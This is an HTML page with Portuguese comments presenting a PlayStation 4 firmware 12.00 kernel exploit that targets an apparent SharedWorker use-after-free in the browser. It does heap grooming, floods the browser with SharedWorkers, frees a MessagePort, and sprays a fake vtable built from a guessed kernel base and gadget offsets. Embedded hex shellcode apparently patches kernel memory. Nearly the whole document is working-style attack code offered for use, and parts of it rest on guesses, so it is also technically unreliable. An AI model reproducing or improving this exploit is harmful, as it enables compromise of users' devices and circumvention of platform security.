<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>PS4 12.00 - LAPSE KERNEL INTEGRATION</title>
    
</head>
<body>

    <h1>PS4 12.00 - LAPSE ARCHITECTURE</h1>
    <h3>Target: SharedWorker UAF | Payload: Gezine 12.00</h3>
    
    <div style="background: #161b22; padding: 15px; border-radius: 10px; display: inline-block;">
        <label>1. Tamanho do Objeto (Spray Size):</label><br>
        <select id="size_selector">
            <option value="0x200">0x200 (512 bytes)</option>
            <option value="0x400">0x400 (1024 bytes) - Testado</option>
            <option value="0x800">0x800 (2048 bytes)</option>
            <option value="0x1000">0x1000 (4096 bytes)</option>
            <option value="0x2000">0x2000 (8192 bytes) - Comum no Lapse</option>
            <option value="0x4000">0x4000 (16384 bytes)</option>
            <option value="0x8000">0x8000 (32768 bytes)</option>
        </select>
        <br>
        <button onclick="run_lapse()">INICIAR EXPLOIT</button>
    </div>

    <div id="log">Logs do Sistema...</div>

    <script>
        function log(msg, cls="") {
            var d = document.getElementById("log");
            d.innerHTML += `<div class="${cls}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            d.scrollTop = d.scrollHeight;
        }

        // =================================================================
        // 1. CONFIGURAÇÃO (Baseada no seu sucesso anterior)
        // =================================================================
        // Base que causou o "Freeze" (Golden Crash)
        var KERNEL_BASE_GUESS = 0x820000000n; 
        
        // Seus Offsets Extraídos (12.00)
        var GADGETS = {
            pop_rdi: 0x2FEB5n,
            sys_mmap: 0x7500n,
            jmp_rsi: 0x47b31n
        };

        // Shellcode 12.00 (Gezine)
        var shellcode_hex = "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb000000bf90e9ffff41b8eb000000668981a3761b0041b9eb00000041baeb00000041bbeb000000b890e9ffff4881c2717904006689b1b3761b006689b9d3761b0066448981f47a6200c681cd0a0000ebc681cdd32b00ebc68111d42b00ebc6818dd42b00ebc681d1d42b00ebc6817dd62b00ebc6812ddb2b00ebc681fddb2b00eb66448989df836200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c681e6143900ebc781eec02f000000000066898164711b00c78118771b0090e93c01c78160d83b004831c0c3c6811aa71f0037c6811da71f0037c781802d100102000000488991882d1001c781ac2d1001010000000f20c0480d000001000f22c031c0c3";

        function get_bytes() {
            var b = new Uint8Array(shellcode_hex.length/2);
            for(var i=0; i<shellcode_hex.length; i+=2) b[i/2] = parseInt(shellcode_hex.substr(i,2), 16);
            return b;
        }

        // =================================================================
        // 2. LAPSE MEMORY ALLOCATOR (Estabilização)
        // =================================================================
        var stable_heap = [];

        function prepare_heap() {
            // Técnica Lapse: Usar Arrays de Doubles para limpar o Heap
            // Isso força o GC a rodar e organiza a memória
            log("Lapse Grooming: Alocando DoubleArrays...");
            for(let i=0; i<500; i++) {
                let a = new Array(1024);
                for(let j=0; j<1024; j++) a[j] = 1.1; // Float force
                stable_heap.push(a);
            }
        }

        // =================================================================
        // 3. CONSTRUTOR DO PAYLOAD
        // =================================================================
        function build_payload(size_hex) {
            var size = parseInt(size_hex);
            var buffer = new Uint32Array(size / 4);
            var view = new DataView(buffer.buffer);
            var code = get_bytes();

            var addr_jmp_rsi = KERNEL_BASE_GUESS + GADGETS.jmp_rsi;

            // --- FAKE VTABLE (Estilo Lapse) ---
            // O Lapse costuma preencher o objeto inteiro com o endereço do gadget
            // para garantir que qualquer offset lido caia no lugar certo.
            for(var i=0; i < size; i+=8) {
                view.setBigUint64(i, addr_jmp_rsi, true);
            }

            // Inserir Shellcode no final (Segurança)
            // Se o kernel executar como código (NX Bypass miraculoso)
            var code_start = size - code.length - 16;
            if (code_start > 0) {
                for(var k=0; k<code.length; k++) {
                    view.setUint8(code_start+k, code[k]);
                }
            }

            return buffer;
        }

        // =================================================================
        // 4. EXECUÇÃO (Strict 404 Limit)
        // =================================================================
        var workers_stash = [];

        async function run_lapse() {
            var size_val = document.getElementById("size_selector").value;
            log(`>>> INICIANDO LAPSE MODE (SIZE: ${size_val}) <<<`);
            
            var payload = build_payload(size_val);
            
            // 1. Lapse Grooming
            prepare_heap();
            log("Heap organizado (Lapse Style).");

            // 2. SharedWorker Grooming (0-400)
            log("Alocando Workers (0-400)...");
            for(let i=0; i<400; i++) {
                try {
                    let w = new SharedWorker("data:text/javascript,1", "g"+i);
                    w.port.start();
                    workers_stash.push(w);
                } catch(e){}
            }

            // 3. Trigger Zone (401-404)
            log("Entrando na Zona Crítica (404)...");
            var p_count = 0;
            var it = setInterval(() => {
                // PARADA OBRIGATÓRIA NO 404 (Sem exceder!)
                if(p_count >= 4) {
                    clearInterval(it);
                    trigger_final(payload);
                    return;
                }
                
                let w = new SharedWorker("data:text/javascript,1", "v"+p_count);
                w.port.start();
                workers_stash.push(w);
                p_count++;
                log(`Worker ${401+p_count} criado.`);
            }, 150);
        }

        function trigger_final(payload) {
            log("!!! DISPARANDO SWAP NO 404 !!!", "fail");
            
            // 1. Vítima
            var v = workers_stash.pop(); // Pega o 404
            var port_ref = v.port;       // Guarda referência para teste

            // 2. FREE
            v.port.close();
            v = null;

            // 3. SPRAY MASSIVO (Lapse Style)
            // Lapse usa sprays grandes para garantir estabilidade
            log("Spray Lapse (Reclaim)...");
            var spray = [];
            for(var k=0; k<10000; k++) {
                spray.push(new Uint32Array(payload));
            }

            // 4. VERIFICAÇÃO & EXECUÇÃO
            try {
                // Tenta ler o objeto. Se não for MessagePort, o Reclaim funcionou.
                var check = port_ref.toString();
                if(check.indexOf("MessagePort") === -1) {
                    log("!!! SUCESSO: OBJETO SUBSTITUÍDO !!!", "success");
                    log("O tamanho " + document.getElementById("size_selector").value + " é o correto!", "success");
                    alert("Objeto Corrompido! O Kernel deve executar em breve.");
                } else {
                    log(`Falha: Objeto ainda é ${check}. Tamanho incorreto.`);
                    // Força bruta final
                    port_ref.postMessage("PWN");
                }
            } catch(e) {
                log("Erro no acesso (Isso pode ser bom): " + e);
            }
            
            log("Aguardando reação do sistema...");
        }
    </script>
</body>
</html>
